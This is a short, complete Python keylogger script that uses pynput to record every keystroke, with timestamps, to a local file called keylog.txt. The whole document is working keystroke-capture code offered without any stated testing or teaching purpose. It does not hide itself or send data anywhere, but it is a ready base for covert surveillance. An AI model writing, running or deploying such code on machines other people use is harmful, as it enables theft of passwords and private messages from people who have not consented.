from pynput import keyboard
import datetime

log_file = "keylog.txt"

def on_press(key):
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(log_file, "a") as f:
            f.write(f"{time_stamp} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{time_stamp} - [{key}]\n")

def main():
    print(" Enhanced Keylogger started. Logging to", log_file)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
